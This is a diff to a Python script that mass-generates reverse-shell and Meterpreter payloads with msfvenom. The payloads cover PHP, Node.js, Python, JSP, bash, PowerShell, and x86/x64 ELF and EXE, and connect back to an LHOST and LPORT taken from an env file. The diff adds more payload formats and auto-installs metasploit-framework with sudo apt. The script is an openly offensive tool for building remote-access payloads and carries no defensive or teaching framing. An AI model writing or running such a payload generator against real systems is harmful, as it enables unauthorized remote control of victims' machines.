@@ -6,7 +6,9 @@ from tqdm import tqdm
 from dotenv import load_dotenv
 
 
-EnvFile = os.path.expanduser("~/shells/.shell.env")
+
+HomePath = os.path.expanduser("~")
+EnvFile = f"{HomePath}/shells/.shell.env"
 load_dotenv(EnvFile)
 
 
@@ -17,22 +19,11 @@ def ResetEnv():
 		return False
 
 def MakeEnvFile():
-	os.makedirs(os.path.expanduser("~/shells/"), exist_ok=True)
+	os.makedirs(f"{HomePath}/shells", exist_ok=True)
 	if not os.path.isfile(EnvFile):
 		open(EnvFile, "w").close()
 	else:
 		return None
-
-
-def GetPacketManager():
-	Managers = ["apt", "pacman", "dnf", "zypper", "yum"]
-
-	for PacketManager in Managers:
-		if shutil.which(PacketManager):
-			return PacketManager
-
-	return False
-
 
 def CheckIsMSFVenomIsInstalled():
 	if shutil.which("msfvenom"):
@@ -60,36 +51,43 @@ def GenerateShells():
 		"RawShell.php": "php/reverse_php",
 		"RawShell.js": "nodejs/shell_reverse_tcp",
 		"RawShell.py": "python/shell_reverse_tcp",
-		"RawShell.elf": "linux/x64/shell_reverse_tcp",
-		"RawShell.exe": "windows/x64/shell_reverse_tcp",
+		"RawShellX64.elf": "linux/x64/shell_reverse_tcp",
+		"RawShellX64.exe": "windows/x64/shell_reverse_tcp",
+		"RawShellX86.elf": "linux/x86/shell_reverse_tcp",
+		"RawShellX86.exe": "windows/x86/shell_reverse_tcp",
+		"RawShell.sh": "cmd/unix/reverse_bash",
+		"RawShellX64.ps1": "windows/x64/powershell_reverse_tcp",
+		"RawShell.jsp": "java/shell_reverse_tcp",
 		"Meterpreter.php": "php/meterpreter/reverse_tcp",
 		"Meterpreter.py": "python/meterpreter/reverse_tcp",
-		"Meterpreter.elf": "linux/x64/meterpreter/reverse_tcp",
-		"Meterpreter.exe": "windows/x64/meterpreter/reverse_tcp"
+		"Meterpreterx86.exe": "windows/x86/meterpreter/reverse_tcp",
+		"MeterpreterX86.elf": "linux/x86/meterpreter/reverse_tcp",
+		"MeterpreterX64.elf": "linux/x64/meterpreter/reverse_tcp",
+		"MeterpreterX64.exe": "windows/x64/meterpreter/reverse_tcp"
 	}
-
-	os.makedirs(os.path.expanduser("~/shells/"), exist_ok=True)
 
 	for FileName , Payload in tqdm(Payloads.items()):
 		try:
-			subprocess.run(["sudo", "msfvenom", "-p", Payload, f"LHOST={os.getenv('LHOST')}", f"LPORT={os.getenv('LPORT')}", "-f", "raw", "-o", os.path.expanduser(f"~/shells/{FileName}")], stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL )
+			subprocess.run(["sudo", "msfvenom", "-p", Payload, f"LHOST={os.getenv('LHOST')}", f"LPORT={os.getenv('LPORT')}", "-f", "raw", "-o", f"{HomePath}/shells/{FileName}"], stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL )
 		except Exception as e:
 			print(f"Something went wrong: {e}")
 			sys.exit()
-	subprocess.run(f"sudo chmod u+x {os.path.expanduser('~/shells/*')}", shell=True)
-
-PacketManager = GetPacketManager()
-
-if not PacketManager:
-	sys.exit()
+	subprocess.run(f"sudo chmod u+x {HomePath}/shells/*", shell=True)
+	print(f"Shells are saved in {HomePath}/shells")
 
 if not CheckIsMSFVenomIsInstalled():
 	try:
-		subprocess.run(["sudo", PacketManager , "install", "msfvenom"], check=True)
+		print("Installing metasploit-framework...")
+		subprocess.run(["sudo", "apt" , "install", "-y" ,"metasploit-framework" ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 	except subprocess.CalledProcessError as e:
 		print(f"Something went wrong: {e}")
+		sys.exit()
 else:
 	pass
+
+if not CheckIsMSFVenomIsInstalled():
+    print("metasploit-framework installation failed")
+    sys.exit()
 
 MakeEnvFile()
 CheckAndGetEnvVariables()
